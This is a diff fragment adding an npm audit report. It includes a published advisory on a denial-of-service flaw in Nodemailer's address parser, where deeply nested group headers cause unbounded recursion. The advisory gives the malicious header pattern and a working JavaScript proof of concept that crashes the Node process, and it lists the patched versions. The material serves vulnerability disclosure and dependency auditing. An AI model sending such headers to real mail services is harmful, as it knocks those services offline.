+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/nodemailer/nodemailer/security/advisories/GHSA-rcmh-qjqh-p98v\n- https://github.com/nodemailer/nodemailer/commit/b61b9c0cfd682b6f647754ca338373b68336a150\n- https://github.com/advisories/GHSA-rcmh-qjqh-p98v",
+      "created": "2025-12-01T20:44:25.000Z",
+      "id": 1111074,
+      "npm_advisory_id": null,
+      "overview": "### Summary\nA DoS can occur that immediately halts the system due to the use of an unsafe function.\n\n### Details\nAccording to **RFC 5322**, nested group structures (a group inside another group) are not allowed. Therefore, in lib/addressparser/index.js, the email address parser performs flattening when nested groups appear, since such input is likely to be abnormal. (If the address is valid, it is added as-is.) In other words, the parser flattens all nested groups and inserts them into the final group list.\nHowever, the code implemented for this flattening process can be exploited by malicious input and triggers DoS\n\nRFC 5322 uses a colon (:) to define a group, and commas (,) are used to separate members within a group.\nAt the following location in lib/addressparser/index.js:\n\nhttps://github.com/nodemailer/nodemailer/blob/master/lib/addressparser/index.js#L90\n\nthere is code that performs this flattening. The issue occurs when the email address parser attempts to process the following kind of malicious address header:\n\n```g0: g1: g2: g3: ... gN: victim@example.com;```\n\nBecause no recursion depth limit is enforced, the parser repeatedly invokes itself in the pattern\n`addressparser → _handleAddress → addressparser → ...`\nfor each nested group. As a result, when an attacker sends a header containing many colons, Nodemailer enters infinite recursion, eventually throwing Maximum call stack size exceeded and causing the process to terminate immediately. Due to the structure of this behavior, no authentication is required, and a single request is enough to shut down the service.\n\nThe problematic code section is as follows:\n```js\nif (isGroup) {\n    ...\n    if (data.group.length) {\n        let parsedGroup = addressparser(data.group.join(',')); // <- boom!\n        parsedGroup.forEach(member => {\n            if (member.group) {\n                groupMembers = groupMembers.concat(member.group);\n            } else {\n                groupMembers.push(member);\n            }\n        });\n    }\n}\n```\n`data.group` is expected to contain members separated by commas, but in the attacker’s payload the group contains colon `(:)` tokens. Because of this, the parser repeatedly triggers recursive calls for each colon, proportional to their number.\n\n### PoC\n\n```\nconst nodemailer = require('nodemailer');\n\nfunction buildDeepGroup(depth) {\n  let parts = [];\n  for (let i = 0; i < depth; i++) {\n    parts.push(`g${i}:`);\n  }\n  return parts.join(' ') + ' user@example.com;';\n}\n\nconst DEPTH = 3000; // <- control depth \nconst toHeader = buildDeepGroup(DEPTH);\nconsole.log('to header length:', toHeader.length);\n\nconst transporter = nodemailer.createTransport({\n  streamTransport: true,\n  buffer: true,\n  newline: 'unix'\n});\n\nconsole.log('parsing start');\n\ntransporter.sendMail(\n  {\n    from: 'test@example.com',\n    to: toHeader,\n    subject: 'test',\n    text: 'test'\n  },\n  (err, info) => {\n    if (err) {\n      console.error('error:', err);\n    } else {\n      console.log('finished :', info && info.envelope);\n    }\n  }\n);\n```\nAs a result, when the colon is repeated beyond a certain threshold, the Node.js process terminates immediately.\n\n### Impact\nThe attacker can achieve the following:\n\n1. Force an immediate crash of any server/service that uses Nodemailer\n2. Kill the backend process with a single web request\n3. In environments using PM2/Forever, trigger a continuous restart loop, causing severe resource exhaustion”",
+      "reported_by": null,
+      "title": "Nodemailer’s addressparser is vulnerable to DoS caused by recursive calls",
+      "metadata": null,
+      "cves": [],
+      "access": "public",
+      "severity": "low",
+      "module_name": "nodemailer",
+      "vulnerable_versions": "<=7.0.10",
+      "github_advisory_id": "GHSA-rcmh-qjqh-p98v",
+      "recommendation": "Upgrade to version 7.0.11 or later",
+      "patched_versions": ">=7.0.11",
+      "updated": "2025-12-01T20:44:26.000Z",
+      "cvss": {
+        "score": 0,
+        "vectorString": null
+      },
+      "cwe": [
+        "CWE-703"
+      ],
+      "url": "https://github.com/advisories/GHSA-rcmh-qjqh-p98v"
+    }
+  },
+  "muted": [],
+  "metadata": {
+    "vulnerabilities": {
+      "info": 0,
+      "low": 3,
+      "moderate": 4,
+      "high": 2,
+      "critical": 1
+    },
+    "dependencies": 2035,
+    "devDependencies": 0,
+    "optionalDependencies": 0,
+    "totalDependencies": 2035
+  }
+}
